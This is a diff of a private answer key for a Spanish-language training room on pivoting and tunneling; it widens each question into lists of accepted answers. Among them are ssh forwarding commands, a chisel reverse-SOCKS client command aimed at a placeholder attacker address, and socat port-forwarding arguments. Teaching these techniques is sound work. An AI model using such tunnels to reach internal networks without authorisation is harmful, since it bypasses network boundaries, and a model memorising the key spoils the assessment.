@@ -1,14 +1,49 @@
 # Respuestas del room pivoting-y-tunneling (teoría, sin lab).
 # PRIVADO: el seed lo hashea a la tabla Answer.
-pivoting-y-tunneling-t01-q01: "-L"
-pivoting-y-tunneling-t01-q02: "ssh -N -L 8080:192.168.1.20:8080 usuario@10.10.10.5"
-pivoting-y-tunneling-t01-q03: "-R"
-pivoting-y-tunneling-t01-q04: "-D"
-pivoting-y-tunneling-t02-q01: /etc/proxychains4.conf
+pivoting-y-tunneling-t01-q01:
+  - -L
+  - ssh -L
+pivoting-y-tunneling-t01-q02:
+  - ssh -N -L 8080:192.168.1.20:8080 usuario@10.10.10.5
+  - ssh -L 8080:192.168.1.20:8080 usuario@10.10.10.5
+  - ssh -L 8080:192.168.1.20:8080 -N usuario@10.10.10.5
+  - ssh -L 127.0.0.1:8080:192.168.1.20:8080 usuario@10.10.10.5
+  - ssh -N -L 127.0.0.1:8080:192.168.1.20:8080 usuario@10.10.10.5
+  - ssh -N -L 8080:192.168.1.20:8080 user@10.10.10.5
+  - ssh -L 8080:192.168.1.20:8080 user@10.10.10.5
+pivoting-y-tunneling-t01-q03:
+  - -R
+  - ssh -R
+pivoting-y-tunneling-t01-q04:
+  - -D
+  - ssh -D
+pivoting-y-tunneling-t02-q01:
+  - /etc/proxychains4.conf
+  - /etc/proxychains.conf
+  - proxychains4.conf
+  - proxychains.conf
 pivoting-y-tunneling-t02-q02: socks5 127.0.0.1 1080
-pivoting-y-tunneling-t02-q03: "-Pn"
+pivoting-y-tunneling-t02-q03:
+  - -Pn
+  - Pn
+  - nmap -Pn
 pivoting-y-tunneling-t02-q04: a
-pivoting-y-tunneling-t03-q01: Go
-pivoting-y-tunneling-t03-q02: "chisel client https://TU_IP:443 R:socks"
-pivoting-y-tunneling-t03-q03: "TCP-LISTEN:8080,fork TCP:192.168.1.20:80"
-pivoting-y-tunneling-t03-q04: "la conexión la inicia el pivote hacia fuera (saliente), sin puertos entrantes"
+pivoting-y-tunneling-t03-q01:
+  - Go
+  - golang
+pivoting-y-tunneling-t03-q02:
+  - chisel client https://TU_IP:443 R:socks
+  - ./chisel client https://TU_IP:443 R:socks
+  - chisel client TU_IP:443 R:socks
+  - ./chisel client TU_IP:443 R:socks
+  - chisel client http://TU_IP:443 R:socks
+  - chisel client https://TU_IP:443 R:1080:socks
+  - ./chisel client https://TU_IP:443 R:1080:socks
+pivoting-y-tunneling-t03-q03:
+  - TCP-LISTEN:8080,fork TCP:192.168.1.20:80
+  - socat TCP-LISTEN:8080,fork TCP:192.168.1.20:80
+  - TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.1.20:80
+  - socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.1.20:80
+  - TCP4-LISTEN:8080,fork TCP4:192.168.1.20:80
+  - socat TCP4-LISTEN:8080,fork TCP4:192.168.1.20:80
+pivoting-y-tunneling-t03-q04: c
